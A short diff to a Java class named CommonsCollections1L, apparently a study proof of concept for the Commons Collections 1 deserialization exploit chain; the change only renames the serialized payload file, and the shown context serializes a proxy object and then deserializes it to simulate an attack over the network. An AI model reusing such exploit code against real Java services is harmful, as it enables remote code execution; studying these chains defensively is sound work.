@@ -41,12 +41,12 @@ public class CommonsCollections1L {
         Object o = ctor.newInstance(SuppressWarnings.class, mapProxy);
 
         //payload序列化写入文件，模拟网络传输
-        FileOutputStream fos = new FileOutputStream("payload.bin");
+        FileOutputStream fos = new FileOutputStream("cc1l.out");
         ObjectOutputStream oos = new ObjectOutputStream(fos);
         oos.writeObject(o);
 
         //服务端读取文件，反序列化，模拟网络传输
-        FileInputStream fis = new FileInputStream("payload.bin");
+        FileInputStream fis = new FileInputStream("cc1l.out");
         ObjectInputStream ois = new ObjectInputStream(fis);
         ois.readObject();
     }
